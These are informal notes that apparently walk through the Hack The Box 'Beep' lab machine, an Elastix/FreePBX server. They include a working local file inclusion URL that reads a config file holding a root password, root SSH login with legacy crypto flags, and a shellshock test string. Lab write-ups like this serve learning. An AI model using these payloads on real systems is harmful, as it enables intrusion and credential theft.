- curl -I 10.10.10.7 command to fetch the HTTP headers which included the OS distro in the following line: Server: Apache/2.2.3 (CentOS)
- the following command can be used to test for the version of SSL running on the webserver on port 443: openssl s_client -connect 10.10.10.7:443 -tls1_3 if it connects it confirms the TLS version was 1.3 in this example case (was actually 1.0) [alternatively there is an nmap script: nmap --script ssl-enum-ciphers -p 443 10.10.10.7]
- navigating to https://10.10.10.7 reveals the hosting software is titled "elastix"
- Elastix as an endpoint that is vulnerable to local file inclusion vulnerability, the end point can be found by searching elastix on exploit-db and reading through the post for the LFI vuln. LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
- the above also includes the name of the FreePBX configuration file: amortal.conf
- navigating to https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action and searching for the word "root" reveals that the root account has the password: jEhdIekWmdjE. Thus, we attempt ssh root@10.10.10.7, which gives us the following error: Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1. A google search of this error reveals the following: ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc user@remotehost --> which actually had to be shifted given the error:
┌─[eu-vip-20]─[10.10.14.20]─[yetiswerve@htb-yo4rzcnwlg]─[~]
└──╼ [★]$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@10.10.10.7
Unable to negotiate with 10.10.10.7 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
┌─[eu-vip-20]─[10.10.14.20]─[yetiswerve@htb-yo4rzcnwlg]─[~]
└──╼ [★]$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes256-cbc root@10.10.10.7
- we can then open the /etc/shadow file to find the hash of the fanis user's password, but more easily we have access to the faris' home directory as root: [root@beep ~]# cat /home/fanis/user.txt
- Googling reveals CVE-2012-4869 for pre-authentication remote code execution vulnerablity in FreePBX / Elastix
- that vulnerability reveals the link usable in a browser to view the PBX config file that includes the admin username and password (also usable on the webadmin application)
Exploit: 
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
- more googling reveals that the 2014 CVEs where this is a POC exploit: () { :; };sleep 10 is commonly known as "shellshock"
- digging around our root shell reveals thje asterisk user's mail folder at /var/mail/asterisk

ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes256-cbc root@10.10.10.7